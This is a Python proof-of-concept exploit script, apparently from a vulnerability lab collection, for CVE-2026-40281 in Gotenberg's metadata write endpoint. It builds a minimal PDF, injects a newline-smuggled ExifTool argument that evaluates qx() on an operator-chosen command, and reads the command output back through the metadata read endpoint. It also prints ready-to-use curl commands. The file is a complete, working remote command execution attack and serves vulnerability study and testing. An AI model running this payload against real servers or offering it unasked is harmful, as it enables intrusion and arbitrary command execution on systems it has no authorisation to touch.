#!/usr/bin/env python3
"""Generate the PoC PDF for CVE-2026-40281 (Gotenberg ExifTool argument injection).

The /forms/pdfengines/metadata/write endpoint passes metadata values to
ExifTool unsanitized, so a newline inside a value injects extra ExifTool
command line arguments. With -u the script sends the requests itself; with
-o it only writes the PDF and prints the equivalent curl commands. Add -v
to print the PDF returned by the metadata write endpoint.

Usage: python3 poc.py -u http://your-ip:3000 -c id    # send the requests
       python3 poc.py -u http://your-ip:3000 -c id -v # print returned PDF
       python3 poc.py -o poc.pdf -c id                # generate + print curl
"""
import argparse
import io
import json
import sys
import urllib.error
import urllib.request
import uuid

WRITE_PATH = "/forms/pdfengines/metadata/write"
READ_PATH = "/forms/pdfengines/metadata/read"
DEFAULT_URL = "http://127.0.0.1:3000"


def build_pdf() -> bytes:
    """Build a minimal but structurally valid one-page PDF entirely offline."""
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 100] >>",
    ]
    pdf = bytearray(b"%PDF-1.4\n")
    offsets = []
    for number, obj in enumerate(objects, 1):
        offsets.append(len(pdf))
        pdf += b"%d 0 obj\n%b\nendobj\n" % (number, obj)
    start_xref = len(pdf)
    pdf += b"xref\n0 %d\n" % (len(objects) + 1)
    pdf += b"0000000000 65535 f \n"
    for offset in offsets:
        pdf += b"%010d 00000 n \n" % offset
    pdf += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (
        len(objects) + 1,
        start_xref,
    )
    return bytes(pdf)


def metadata_payload(command: str) -> str:
    """The injected metadata JSON: the newline adds a second ExifTool argument
    that evaluates qx(command) while writing the Title tag."""
    return '{"Title":"x\\n-Title<${PDFVersion;$_=qx(%s)}"}' % command


def printable_pdf(pdf: bytes) -> str:
    """Replace non-printable PDF bytes with dots for terminal output."""
    return "".join(
        chr(byte) if byte == 10 or 32 <= byte <= 126 else "." for byte in pdf
    )


def post_multipart(url: str, metadata, pdf: bytes, upload_name: str):
    """POST a PDF (and optionally a metadata JSON field), return (status, body)."""
    boundary = "----vulhub" + uuid.uuid4().hex
    buf = io.BytesIO()

    def field(name: str, value: str):
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        buf.write(value.encode())
        buf.write(b"\r\n")

    def file_field(name: str, filename: str, data: bytes):
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(
            f'Content-Disposition: form-data; name="{name}"; '
            f'filename="{filename}"\r\n'.encode()
        )
        buf.write(b"Content-Type: application/pdf\r\n\r\n")
        buf.write(data)
        buf.write(b"\r\n")

    if metadata is not None:
        field("metadata", metadata)
    file_field("files", upload_name, pdf)
    buf.write(f"--{boundary}--\r\n".encode())
    body = buf.getvalue()

    request = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.read()


def die(message: str):
    print(f"[!] {message}")
    sys.exit(1)


def print_curl(output: str, command: str):
    print(f"[*] Command to execute on the target: {command}")
    print("[*] Write the injected metadata into the PDF, expecting HTTP 200:")
    print()
    print("curl -s -o rce.pdf -w 'HTTP %{http_code}\\n' \\")
    print(f"    -F 'files=@{output};type=application/pdf' \\")
    print(f"    --form-string 'metadata={metadata_payload(command)}' \\")
    print(f"    {DEFAULT_URL}{WRITE_PATH}")
    print()
    print("[*] Read back the Title of the returned PDF to obtain the command output:")
    print()
    print(f"curl -s -F 'files=@rce.pdf' {DEFAULT_URL}{READ_PATH}")


def exploit(url: str, command: str, verbose: bool = False):
    print(f"[*] Target: {url}")
    print(f"[*] Command to execute on the target: {command}")
    status, returned_pdf = post_multipart(
        url.rstrip("/") + WRITE_PATH,
        metadata_payload(command),
        build_pdf(),
        "poc.pdf",
    )
    if status == 400:
        die("the target rejected the newline in the metadata value (HTTP 400), it looks patched (>= 8.31.0)")
    if status != 200:
        die(f"metadata write failed with HTTP {status}: {returned_pdf.decode(errors='replace').strip()}")
    print("[+] Metadata written (HTTP 200), reading back the Title of the returned PDF")
    status, body = post_multipart(
        url.rstrip("/") + READ_PATH, None, returned_pdf, "rce.pdf"
    )
    if status != 200:
        die(f"metadata read failed with HTTP {status}: {body.decode(errors='replace').strip()}")
    title = next(iter(json.loads(body).values())).get("Title", "")
    print("[+] Command output:")
    print(f"    {title.strip()}")
    if verbose:
        print("[+] Returned PDF (non-printable bytes replaced with '.'):")
        print(printable_pdf(returned_pdf))


def parse_args():
    parser = argparse.ArgumentParser(
        description="CVE-2026-40281 - PoC for the Gotenberg ExifTool argument injection",
    )
    parser.add_argument(
        "-c", "--command", default="id",
        help="command to execute on the target (default: %(default)s)",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="print the returned PDF with non-printable bytes replaced by dots",
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        "-u", "--url",
        help=f"send the requests to this Gotenberg URL, e.g. {DEFAULT_URL}",
    )
    group.add_argument(
        "-o", "--output",
        help="only write the PoC PDF to this path and print the equivalent curl commands",
    )
    args = parser.parse_args()
    if args.verbose and not args.url:
        parser.error("-v/--verbose requires -u/--url")
    return args


def main():
    args = parse_args()
    if args.url:
        exploit(args.url, args.command, args.verbose)
        return
    output = args.output or "poc.pdf"
    pdf = build_pdf()
    with open(output, "wb") as f:
        f.write(pdf)
    print(f"[+] PoC PDF written to {output} ({len(pdf)} bytes)")
    print_curl(output, args.command)


if __name__ == "__main__":
    main()
